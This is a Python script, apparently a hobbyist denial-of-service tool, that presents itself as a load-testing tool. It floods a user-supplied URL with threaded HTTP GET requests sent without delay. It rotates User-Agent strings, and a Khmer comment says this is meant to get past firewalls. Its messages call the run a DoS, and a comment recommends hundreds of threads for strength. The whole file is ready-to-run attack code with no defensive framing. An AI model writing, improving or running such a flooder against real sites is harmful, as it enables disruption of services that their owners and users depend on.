import threading
import requests
import random
import time

# Color constants
GREEN = '\033[92m'
RESET = '\033[0m'

banner = """
███████╗███████╗███████╗███████╗███████╗███████╗
██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
█████╗  ███████╗█████╗  ███████╗█████╗  ███████╗█████╗
██╔══╝  ╚════██║██╔══╝  ╚════██║██╔══╝  ╚════██║██╔══╝
███████╗███████║███████╗███████║███████╗███████║███████╗███████╗
╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝
"""
print(GREEN + banner + RESET)
# បញ្ជី User-Agents ដើម្បីបន្លំ Firewall
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

def attack(url, stats):
    while stats['running']:
        try:
            # បង្កើត Header ចៃដន្យ
            headers = {
                'User-Agent': random.choice(user_agents),
                'Cache-Control': 'no-cache',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive'
            }
            # ផ្ញើ Request ដោយមិនរង់ចាំ (No delay)
            response = requests.get(url, headers=headers, timeout=5)
            stats['total'] += 1
            if response.status_code == 200:
                stats['success'] += 1
            else:
                stats['fail'] += 1
        except:
            stats['fail'] += 1
            # បើ Server ចាប់ផ្តើមគាំង យើងអាចបន្ថែមការឈប់សម្រាកខ្លីៗនៅទីនេះ
            pass

def main():
    print("=== Advanced Load Testing Tool ===")
    target_url = input(" URL & IP TARGET: ")
    # បើចង់ឱ្យខ្លាំង ដាក់ចន្លោះពី 100 ទៅ 500 (អាស្រ័យលើកម្លាំង CPU របស់អ្នក)
    thread_count = int(input(" Threads "))

    stats = {'total': 0, 'success': 0, 'fail': 0, 'running': True}
    
    print(f"\n[!] Request Do {target_url} Use {thread_count} Threads...")
    
    for i in range(thread_count):
        t = threading.Thread(target=attack, args=(target_url, stats))
        t.daemon = True
        t.start()

    try:
        while True:
            print(f"\r[+] Requests: {stats['total']} | Succesfull: {stats['success']} | Failed: {stats['fail']}", end="")
            time.sleep(0.5)
    except KeyboardInterrupt:
        stats['running'] = False
        print("\n\n[!] Stop Dos។")

if __name__ == "__main__":
    main()

    #Developer Steven H4CK